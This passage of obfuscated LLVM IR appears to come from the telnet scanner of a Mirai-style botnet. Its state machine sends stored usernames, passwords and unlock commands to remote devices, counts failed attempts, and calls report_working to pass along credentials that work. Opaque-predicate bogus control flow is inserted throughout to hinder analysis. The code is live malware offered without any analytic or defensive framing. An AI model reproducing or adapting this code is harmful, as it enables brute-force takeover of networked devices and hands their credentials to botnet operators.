  %1108 = load i32, i32* @x.53
  %1109 = load i32, i32* @y.54
  %1110 = sub i32 %1108, 1
  %1111 = mul i32 %1108, %1110
  %1112 = urem i32 %1111, 2
  %1113 = icmp eq i32 %1112, 0
  %1114 = icmp slt i32 %1109, 10
  %1115 = or i1 %1113, %1114
  br i1 %1115, label %originalBBpart2194, label %originalBB192alteredBB

originalBBpart2194:                               ; preds = %originalBB192
  br i1 %1107, label %1116, label %1194

; <label>:1116:                                   ; preds = %originalBBpart2194
  %1117 = load i32, i32* @x.53
  %1118 = load i32, i32* @y.54
  %1119 = sub i32 %1117, 1
  %1120 = mul i32 %1117, %1119
  %1121 = urem i32 %1120, 2
  %1122 = icmp eq i32 %1121, 0
  %1123 = icmp slt i32 %1118, 10
  %1124 = or i1 %1122, %1123
  br i1 %1124, label %originalBB196, label %originalBB196alteredBB

originalBB196:                                    ; preds = %originalBB196alteredBB, %1116
  %1125 = call i32* @__errno_location() #7
  %1126 = load i32, i32* %1125, align 4
  %1127 = icmp ne i32 %1126, 11
  %1128 = load i32, i32* @x.53
  %1129 = load i32, i32* @y.54
  %1130 = sub i32 %1128, 1
  %1131 = mul i32 %1128, %1130
  %1132 = urem i32 %1131, 2
  %1133 = icmp eq i32 %1132, 0
  %1134 = icmp slt i32 %1129, 10
  %1135 = or i1 %1133, %1134
  br i1 %1135, label %originalBBpart2198, label %originalBB196alteredBB

originalBBpart2198:                               ; preds = %originalBB196
  br i1 %1127, label %1136, label %1193

; <label>:1136:                                   ; preds = %originalBBpart2198
  %1137 = load i32, i32* @x.53
  %1138 = load i32, i32* @y.54
  %1139 = sub i32 %1137, 1
  %1140 = mul i32 %1137, %1139
  %1141 = urem i32 %1140, 2
  %1142 = icmp eq i32 %1141, 0
  %1143 = icmp slt i32 %1138, 10
  %1144 = or i1 %1142, %1143
  br i1 %1144, label %originalBB200, label %originalBB200alteredBB

originalBB200:                                    ; preds = %originalBB200alteredBB, %1136
  %1145 = call i32* @__errno_location() #7
  %1146 = load i32, i32* %1145, align 4
  %1147 = icmp ne i32 %1146, 11
  %1148 = load i32, i32* @x.53
  %1149 = load i32, i32* @y.54
  %1150 = sub i32 %1148, 1
  %1151 = mul i32 %1148, %1150
  %1152 = urem i32 %1151, 2
  %1153 = icmp eq i32 %1152, 0
  %1154 = icmp slt i32 %1149, 10
  %1155 = or i1 %1153, %1154
  br i1 %1155, label %originalBBpart2202, label %originalBB200alteredBB

originalBBpart2202:                               ; preds = %originalBB200
  br i1 %1147, label %1156, label %1193

; <label>:1156:                                   ; preds = %originalBBpart2202
  %1157 = load i32, i32* @x.53
  %1158 = load i32, i32* @y.54
  %1159 = sub i32 %1157, 1
  %1160 = mul i32 %1157, %1159
  %1161 = urem i32 %1160, 2
  %1162 = icmp eq i32 %1161, 0
  %1163 = icmp slt i32 %1158, 10
  %1164 = or i1 %1162, %1163
  br i1 %1164, label %originalBB204, label %originalBB204alteredBB

originalBB204:                                    ; preds = %originalBB204alteredBB, %1156
  %1165 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1166 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1165, i32 0, i32 1
  %1167 = load i32, i32* %1166, align 8
  %1168 = call i32 @close(i32 %1167)
  %1169 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1170 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1169, i32 0, i32 1
  store i32 -1, i32* %1170, align 8
  %1171 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1172 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1171, i32 0, i32 8
  %1173 = load i8, i8* %1172, align 8
  %1174 = add i8 %1173, 1
  store i8 %1174, i8* %1172, align 8
  %1175 = zext i8 %1174 to i32
  %1176 = icmp sge i32 %1175, 10
  %1177 = load i32, i32* @x.53
  %1178 = load i32, i32* @y.54
  %1179 = sub i32 %1177, 1
  %1180 = mul i32 %1177, %1179
  %1181 = urem i32 %1180, 2
  %1182 = icmp eq i32 %1181, 0
  %1183 = icmp slt i32 %1178, 10
  %1184 = or i1 %1182, %1183
  br i1 %1184, label %originalBBpart2212, label %originalBB204alteredBB

originalBBpart2212:                               ; preds = %originalBB204
  br i1 %1176, label %1185, label %1190

; <label>:1185:                                   ; preds = %originalBBpart2212
  %1186 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1187 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1186, i32 0, i32 8
  store i8 0, i8* %1187, align 8
  %1188 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1189 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1188, i32 0, i32 3
  store i32 0, i32* %1189, align 8
  br label %1192

; <label>:1190:                                   ; preds = %originalBBpart2212
  %1191 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %1191)
  br label %1192

; <label>:1192:                                   ; preds = %1190, %1185
  br label %1193

; <label>:1193:                                   ; preds = %1192, %originalBBpart2202, %originalBBpart2198
  br label %1630

; <label>:1194:                                   ; preds = %originalBBpart2194
  %1195 = load i32, i32* %32, align 4
  %1196 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1197 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1196, i32 0, i32 6
  %1198 = load i32, i32* %1197, align 4
  %1199 = add nsw i32 %1198, %1195
  store i32 %1199, i32* %1197, align 4
  %1200 = load i32, i32* @fake_time, align 4
  %1201 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1202 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1201, i32 0, i32 2
  store i32 %1200, i32* %1202, align 4
  br label %1203

; <label>:1203:                                   ; preds = %originalBBpart2256, %1194
  store i32 0, i32* %33, align 4
  %1204 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1205 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1204, i32 0, i32 3
  %1206 = load i32, i32* %1205, align 8
  switch i32 %1206, label %1578 [
    i32 2, label %1207
    i32 3, label %1231
    i32 4, label %1274
    i32 5, label %1317
    i32 6, label %1353
    i32 7, label %1373
    i32 8, label %1393
    i32 9, label %1429
    i32 10, label %1481
  ]

; <label>:1207:                                   ; preds = %1203
  %1208 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1209 = call i32 @consume_iacs(%struct.scanner_connection* %1208)
  store i32 %1209, i32* %33, align 4
  %1210 = icmp sgt i32 %1209, 0
  br i1 %1210, label %1211, label %1214

; <label>:1211:                                   ; preds = %1207
  %1212 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1213 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1212, i32 0, i32 3
  store i32 3, i32* %1213, align 8
  br label %1214

; <label>:1214:                                   ; preds = %1211, %1207
  %1215 = load i32, i32* @x.53
  %1216 = load i32, i32* @y.54
  %1217 = sub i32 %1215, 1
  %1218 = mul i32 %1215, %1217
  %1219 = urem i32 %1218, 2
  %1220 = icmp eq i32 %1219, 0
  %1221 = icmp slt i32 %1216, 10
  %1222 = or i1 %1220, %1221
  br i1 %1222, label %originalBB214, label %originalBB214alteredBB

originalBB214:                                    ; preds = %originalBB214alteredBB, %1214
  %1223 = load i32, i32* @x.53
  %1224 = load i32, i32* @y.54
  %1225 = sub i32 %1223, 1
  %1226 = mul i32 %1223, %1225
  %1227 = urem i32 %1226, 2
  %1228 = icmp eq i32 %1227, 0
  %1229 = icmp slt i32 %1224, 10
  %1230 = or i1 %1228, %1229
  br i1 %1230, label %originalBBpart2216, label %originalBB214alteredBB

originalBBpart2216:                               ; preds = %originalBB214
  br label %1579

; <label>:1231:                                   ; preds = %1203
  %1232 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1233 = call i32 @consume_user_prompt(%struct.scanner_connection* %1232)
  store i32 %1233, i32* %33, align 4
  %1234 = icmp sgt i32 %1233, 0
  br i1 %1234, label %1235, label %1273

; <label>:1235:                                   ; preds = %1231
  %1236 = load i32, i32* @x.53
  %1237 = load i32, i32* @y.54
  %1238 = sub i32 %1236, 1
  %1239 = mul i32 %1236, %1238
  %1240 = urem i32 %1239, 2
  %1241 = icmp eq i32 %1240, 0
  %1242 = icmp slt i32 %1237, 10
  %1243 = or i1 %1241, %1242
  br i1 %1243, label %originalBB218, label %originalBB218alteredBB

originalBB218:                                    ; preds = %originalBB218alteredBB, %1235
  %1244 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1245 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1244, i32 0, i32 1
  %1246 = load i32, i32* %1245, align 8
  %1247 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1248 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1247, i32 0, i32 0
  %1249 = load %struct.scanner_auth*, %struct.scanner_auth** %1248, align 8
  %1250 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1249, i32 0, i32 0
  %1251 = load i8*, i8** %1250, align 8
  %1252 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1253 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1252, i32 0, i32 0
  %1254 = load %struct.scanner_auth*, %struct.scanner_auth** %1253, align 8
  %1255 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1254, i32 0, i32 4
  %1256 = load i8, i8* %1255, align 4
  %1257 = zext i8 %1256 to i64
  %1258 = call i64 @send(i32 %1246, i8* %1251, i64 %1257, i32 16384)
  %1259 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1260 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1259, i32 0, i32 1
  %1261 = load i32, i32* %1260, align 8
  %1262 = call i64 @send(i32 %1261, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  %1263 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1264 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1263, i32 0, i32 3
  store i32 4, i32* %1264, align 8
  %1265 = load i32, i32* @x.53
  %1266 = load i32, i32* @y.54
  %1267 = sub i32 %1265, 1
  %1268 = mul i32 %1265, %1267
  %1269 = urem i32 %1268, 2
  %1270 = icmp eq i32 %1269, 0
  %1271 = icmp slt i32 %1266, 10
  %1272 = or i1 %1270, %1271
  br i1 %1272, label %originalBBpart2220, label %originalBB218alteredBB

originalBBpart2220:                               ; preds = %originalBB218
  br label %1273

; <label>:1273:                                   ; preds = %originalBBpart2220, %1231
  br label %1579

; <label>:1274:                                   ; preds = %1203
  %1275 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1276 = call i32 @consume_pass_prompt(%struct.scanner_connection* %1275)
  store i32 %1276, i32* %33, align 4
  %1277 = icmp sgt i32 %1276, 0
  br i1 %1277, label %1278, label %1316

; <label>:1278:                                   ; preds = %1274
  %1279 = load i32, i32* @x.53
  %1280 = load i32, i32* @y.54
  %1281 = sub i32 %1279, 1
  %1282 = mul i32 %1279, %1281
  %1283 = urem i32 %1282, 2
  %1284 = icmp eq i32 %1283, 0
  %1285 = icmp slt i32 %1280, 10
  %1286 = or i1 %1284, %1285
  br i1 %1286, label %originalBB222, label %originalBB222alteredBB

originalBB222:                                    ; preds = %originalBB222alteredBB, %1278
  %1287 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1288 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1287, i32 0, i32 1
  %1289 = load i32, i32* %1288, align 8
  %1290 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1291 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1290, i32 0, i32 0
  %1292 = load %struct.scanner_auth*, %struct.scanner_auth** %1291, align 8
  %1293 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1292, i32 0, i32 1
  %1294 = load i8*, i8** %1293, align 8
  %1295 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1296 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1295, i32 0, i32 0
  %1297 = load %struct.scanner_auth*, %struct.scanner_auth** %1296, align 8
  %1298 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1297, i32 0, i32 5
  %1299 = load i8, i8* %1298, align 1
  %1300 = zext i8 %1299 to i64
  %1301 = call i64 @send(i32 %1289, i8* %1294, i64 %1300, i32 16384)
  %1302 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1303 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1302, i32 0, i32 1
  %1304 = load i32, i32* %1303, align 8
  %1305 = call i64 @send(i32 %1304, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  %1306 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1307 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1306, i32 0, i32 3
  store i32 5, i32* %1307, align 8
  %1308 = load i32, i32* @x.53
  %1309 = load i32, i32* @y.54
  %1310 = sub i32 %1308, 1
  %1311 = mul i32 %1308, %1310
  %1312 = urem i32 %1311, 2
  %1313 = icmp eq i32 %1312, 0
  %1314 = icmp slt i32 %1309, 10
  %1315 = or i1 %1313, %1314
  br i1 %1315, label %originalBBpart2224, label %originalBB222alteredBB

originalBBpart2224:                               ; preds = %originalBB222
  br label %1316

; <label>:1316:                                   ; preds = %originalBBpart2224, %1274
  br label %1579

; <label>:1317:                                   ; preds = %1203
  %1318 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1319 = call i32 @consume_any_prompt(%struct.scanner_connection* %1318)
  store i32 %1319, i32* %33, align 4
  %1320 = icmp sgt i32 %1319, 0
  br i1 %1320, label %1321, label %1336

; <label>:1321:                                   ; preds = %1317
  call void @table_unlock_val(i8 zeroext 5)
  %1322 = call i8* @table_retrieve_val(i32 5, i32* %35)
  store i8* %1322, i8** %34, align 8
  %1323 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1324 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1323, i32 0, i32 1
  %1325 = load i32, i32* %1324, align 8
  %1326 = load i8*, i8** %34, align 8
  %1327 = load i32, i32* %35, align 4
  %1328 = sext i32 %1327 to i64
  %1329 = call i64 @send(i32 %1325, i8* %1326, i64 %1328, i32 16384)
  %1330 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1331 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1330, i32 0, i32 1
  %1332 = load i32, i32* %1331, align 8
  %1333 = call i64 @send(i32 %1332, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 5)
  %1334 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1335 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1334, i32 0, i32 3
  store i32 6, i32* %1335, align 8
  br label %1336

; <label>:1336:                                   ; preds = %1321, %1317
  %1337 = load i32, i32* @x.53
  %1338 = load i32, i32* @y.54
  %1339 = sub i32 %1337, 1
  %1340 = mul i32 %1337, %1339
  %1341 = urem i32 %1340, 2
  %1342 = icmp eq i32 %1341, 0
  %1343 = icmp slt i32 %1338, 10
  %1344 = or i1 %1342, %1343
  br i1 %1344, label %originalBB226, label %originalBB226alteredBB

originalBB226:                                    ; preds = %originalBB226alteredBB, %1336
  %1345 = load i32, i32* @x.53
  %1346 = load i32, i32* @y.54
  %1347 = sub i32 %1345, 1
  %1348 = mul i32 %1345, %1347
  %1349 = urem i32 %1348, 2
  %1350 = icmp eq i32 %1349, 0
  %1351 = icmp slt i32 %1346, 10
  %1352 = or i1 %1350, %1351
  br i1 %1352, label %originalBBpart2228, label %originalBB226alteredBB

originalBBpart2228:                               ; preds = %originalBB226
  br label %1579

; <label>:1353:                                   ; preds = %1203
  %1354 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1355 = call i32 @consume_any_prompt(%struct.scanner_connection* %1354)
  store i32 %1355, i32* %33, align 4
  %1356 = icmp sgt i32 %1355, 0
  br i1 %1356, label %1357, label %1372

; <label>:1357:                                   ; preds = %1353
  call void @table_unlock_val(i8 zeroext 6)
  %1358 = call i8* @table_retrieve_val(i32 6, i32* %37)
  store i8* %1358, i8** %36, align 8
  %1359 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1360 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1359, i32 0, i32 1
  %1361 = load i32, i32* %1360, align 8
  %1362 = load i8*, i8** %36, align 8
  %1363 = load i32, i32* %37, align 4
  %1364 = sext i32 %1363 to i64
  %1365 = call i64 @send(i32 %1361, i8* %1362, i64 %1364, i32 16384)
  %1366 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1367 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1366, i32 0, i32 1
  %1368 = load i32, i32* %1367, align 8
  %1369 = call i64 @send(i32 %1368, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 6)
  %1370 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1371 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1370, i32 0, i32 3
  store i32 7, i32* %1371, align 8
  br label %1372

; <label>:1372:                                   ; preds = %1357, %1353
  br label %1579

; <label>:1373:                                   ; preds = %1203
  %1374 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1375 = call i32 @consume_any_prompt(%struct.scanner_connection* %1374)
  store i32 %1375, i32* %33, align 4
  %1376 = icmp sgt i32 %1375, 0
  br i1 %1376, label %1377, label %1392

; <label>:1377:                                   ; preds = %1373
  call void @table_unlock_val(i8 zeroext 4)
  %1378 = call i8* @table_retrieve_val(i32 4, i32* %39)
  store i8* %1378, i8** %38, align 8
  %1379 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1380 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1379, i32 0, i32 1
  %1381 = load i32, i32* %1380, align 8
  %1382 = load i8*, i8** %38, align 8
  %1383 = load i32, i32* %39, align 4
  %1384 = sext i32 %1383 to i64
  %1385 = call i64 @send(i32 %1381, i8* %1382, i64 %1384, i32 16384)
  %1386 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1387 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1386, i32 0, i32 1
  %1388 = load i32, i32* %1387, align 8
  %1389 = call i64 @send(i32 %1388, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 4)
  %1390 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1391 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1390, i32 0, i32 3
  store i32 8, i32* %1391, align 8
  br label %1392

; <label>:1392:                                   ; preds = %1377, %1373
  br label %1579

; <label>:1393:                                   ; preds = %1203
  %1394 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1395 = call i32 @consume_any_prompt(%struct.scanner_connection* %1394)
  store i32 %1395, i32* %33, align 4
  %1396 = icmp sgt i32 %1395, 0
  br i1 %1396, label %1397, label %1428

; <label>:1397:                                   ; preds = %1393
  %1398 = load i32, i32* @x.53
  %1399 = load i32, i32* @y.54
  %1400 = sub i32 %1398, 1
  %1401 = mul i32 %1398, %1400
  %1402 = urem i32 %1401, 2
  %1403 = icmp eq i32 %1402, 0
  %1404 = icmp slt i32 %1399, 10
  %1405 = or i1 %1403, %1404
  br i1 %1405, label %originalBB230, label %originalBB230alteredBB

originalBB230:                                    ; preds = %originalBB230alteredBB, %1397
  call void @table_unlock_val(i8 zeroext 7)
  %1406 = call i8* @table_retrieve_val(i32 7, i32* %41)
  store i8* %1406, i8** %40, align 8
  %1407 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1408 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1407, i32 0, i32 1
  %1409 = load i32, i32* %1408, align 8
  %1410 = load i8*, i8** %40, align 8
  %1411 = load i32, i32* %41, align 4
  %1412 = sext i32 %1411 to i64
  %1413 = call i64 @send(i32 %1409, i8* %1410, i64 %1412, i32 16384)
  %1414 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1415 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1414, i32 0, i32 1
  %1416 = load i32, i32* %1415, align 8
  %1417 = call i64 @send(i32 %1416, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 7)
  %1418 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1419 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1418, i32 0, i32 3
  store i32 9, i32* %1419, align 8
  %1420 = load i32, i32* @x.53
  %1421 = load i32, i32* @y.54
  %1422 = sub i32 %1420, 1
  %1423 = mul i32 %1420, %1422
  %1424 = urem i32 %1423, 2
  %1425 = icmp eq i32 %1424, 0
  %1426 = icmp slt i32 %1421, 10
  %1427 = or i1 %1425, %1426
  br i1 %1427, label %originalBBpart2232, label %originalBB230alteredBB

originalBBpart2232:                               ; preds = %originalBB230
  br label %1428

; <label>:1428:                                   ; preds = %originalBBpart2232, %1393
  br label %1579

; <label>:1429:                                   ; preds = %1203
  %1430 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1431 = call i32 @consume_any_prompt(%struct.scanner_connection* %1430)
  store i32 %1431, i32* %33, align 4
  %1432 = icmp sgt i32 %1431, 0
  br i1 %1432, label %1433, label %1464

; <label>:1433:                                   ; preds = %1429
  %1434 = load i32, i32* @x.53
  %1435 = load i32, i32* @y.54
  %1436 = sub i32 %1434, 1
  %1437 = mul i32 %1434, %1436
  %1438 = urem i32 %1437, 2
  %1439 = icmp eq i32 %1438, 0
  %1440 = icmp slt i32 %1435, 10
  %1441 = or i1 %1439, %1440
  br i1 %1441, label %originalBB234, label %originalBB234alteredBB

originalBB234:                                    ; preds = %originalBB234alteredBB, %1433
  call void @table_unlock_val(i8 zeroext 8)
  %1442 = call i8* @table_retrieve_val(i32 8, i32* %43)
  store i8* %1442, i8** %42, align 8
  %1443 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1444 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1443, i32 0, i32 1
  %1445 = load i32, i32* %1444, align 8
  %1446 = load i8*, i8** %42, align 8
  %1447 = load i32, i32* %43, align 4
  %1448 = sext i32 %1447 to i64
  %1449 = call i64 @send(i32 %1445, i8* %1446, i64 %1448, i32 16384)
  %1450 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1451 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1450, i32 0, i32 1
  %1452 = load i32, i32* %1451, align 8
  %1453 = call i64 @send(i32 %1452, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 8)
  %1454 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1455 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1454, i32 0, i32 3
  store i32 10, i32* %1455, align 8
  %1456 = load i32, i32* @x.53
  %1457 = load i32, i32* @y.54
  %1458 = sub i32 %1456, 1
  %1459 = mul i32 %1456, %1458
  %1460 = urem i32 %1459, 2
  %1461 = icmp eq i32 %1460, 0
  %1462 = icmp slt i32 %1457, 10
  %1463 = or i1 %1461, %1462
  br i1 %1463, label %originalBBpart2236, label %originalBB234alteredBB

originalBBpart2236:                               ; preds = %originalBB234
  br label %1464

; <label>:1464:                                   ; preds = %originalBBpart2236, %1429
  %1465 = load i32, i32* @x.53
  %1466 = load i32, i32* @y.54
  %1467 = sub i32 %1465, 1
  %1468 = mul i32 %1465, %1467
  %1469 = urem i32 %1468, 2
  %1470 = icmp eq i32 %1469, 0
  %1471 = icmp slt i32 %1466, 10
  %1472 = or i1 %1470, %1471
  br i1 %1472, label %originalBB238, label %originalBB238alteredBB

originalBB238:                                    ; preds = %originalBB238alteredBB, %1464
  %1473 = load i32, i32* @x.53
  %1474 = load i32, i32* @y.54
  %1475 = sub i32 %1473, 1
  %1476 = mul i32 %1473, %1475
  %1477 = urem i32 %1476, 2
  %1478 = icmp eq i32 %1477, 0
  %1479 = icmp slt i32 %1474, 10
  %1480 = or i1 %1478, %1479
  br i1 %1480, label %originalBBpart2240, label %originalBB238alteredBB

originalBBpart2240:                               ; preds = %originalBB238
  br label %1579

; <label>:1481:                                   ; preds = %1203
  %1482 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1483 = call i32 @consume_resp_prompt(%struct.scanner_connection* %1482)
  store i32 %1483, i32* %33, align 4
  %1484 = load i32, i32* %33, align 4
  %1485 = icmp eq i32 %1484, -1
  br i1 %1485, label %1486, label %1523

; <label>:1486:                                   ; preds = %1481
  %1487 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1488 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1487, i32 0, i32 1
  %1489 = load i32, i32* %1488, align 8
  %1490 = call i32 @close(i32 %1489)
  %1491 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1492 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1491, i32 0, i32 1
  store i32 -1, i32* %1492, align 8
  %1493 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1494 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1493, i32 0, i32 8
  %1495 = load i8, i8* %1494, align 8
  %1496 = add i8 %1495, 1
  store i8 %1496, i8* %1494, align 8
  %1497 = zext i8 %1496 to i32
  %1498 = icmp eq i32 %1497, 10
  br i1 %1498, label %1499, label %1520

; <label>:1499:                                   ; preds = %1486
  %1500 = load i32, i32* @x.53
  %1501 = load i32, i32* @y.54
  %1502 = sub i32 %1500, 1
  %1503 = mul i32 %1500, %1502
  %1504 = urem i32 %1503, 2
  %1505 = icmp eq i32 %1504, 0
  %1506 = icmp slt i32 %1501, 10
  %1507 = or i1 %1505, %1506
  br i1 %1507, label %originalBB242, label %originalBB242alteredBB

originalBB242:                                    ; preds = %originalBB242alteredBB, %1499
  %1508 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1509 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1508, i32 0, i32 8
  store i8 0, i8* %1509, align 8
  %1510 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1511 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1510, i32 0, i32 3
  store i32 0, i32* %1511, align 8
  %1512 = load i32, i32* @x.53
  %1513 = load i32, i32* @y.54
  %1514 = sub i32 %1512, 1
  %1515 = mul i32 %1512, %1514
  %1516 = urem i32 %1515, 2
  %1517 = icmp eq i32 %1516, 0
  %1518 = icmp slt i32 %1513, 10
  %1519 = or i1 %1517, %1518
  br i1 %1519, label %originalBBpart2244, label %originalBB242alteredBB

originalBBpart2244:                               ; preds = %originalBB242
  br label %1522

; <label>:1520:                                   ; preds = %1486
  %1521 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %1521)
  br label %1522

; <label>:1522:                                   ; preds = %1520, %originalBBpart2244
  br label %1561

; <label>:1523:                                   ; preds = %1481
  %1524 = load i32, i32* %33, align 4
  %1525 = icmp sgt i32 %1524, 0
  br i1 %1525, label %1526, label %1544

; <label>:1526:                                   ; preds = %1523
  %1527 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1528 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1527, i32 0, i32 4
  %1529 = load i32, i32* %1528, align 4
  %1530 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1531 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1530, i32 0, i32 5
  %1532 = load i16, i16* %1531, align 8
  %1533 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1534 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1533, i32 0, i32 0
  %1535 = load %struct.scanner_auth*, %struct.scanner_auth** %1534, align 8
  call void @report_working(i32 %1529, i16 zeroext %1532, %struct.scanner_auth* %1535)
  %1536 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1537 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1536, i32 0, i32 1
  %1538 = load i32, i32* %1537, align 8
  %1539 = call i32 @close(i32 %1538)
  %1540 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1541 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1540, i32 0, i32 1
  store i32 -1, i32* %1541, align 8
  %1542 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1543 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1542, i32 0, i32 3
  store i32 0, i32* %1543, align 8
  br label %1544

; <label>:1544:                                   ; preds = %1526, %1523
  %1545 = load i32, i32* @x.53
  %1546 = load i32, i32* @y.54
  %1547 = sub i32 %1545, 1
  %1548 = mul i32 %1545, %1547
